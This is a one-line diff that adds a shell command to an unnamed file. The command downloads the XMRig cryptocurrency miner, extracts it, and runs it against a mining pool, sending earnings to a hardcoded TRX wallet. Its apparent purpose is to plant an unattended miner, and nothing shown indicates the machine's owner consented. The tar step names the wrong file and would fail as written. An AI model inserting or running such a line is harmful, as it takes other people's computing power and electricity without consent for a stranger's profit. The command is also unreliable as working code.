@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz && tar -xvf xmrig-6.19.2 && ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u TRX:TY1WNvX3Yms4nF7yyA6CbmQQ8uS1BLJe4m.awfulboy#0hl3-zs7g -p x
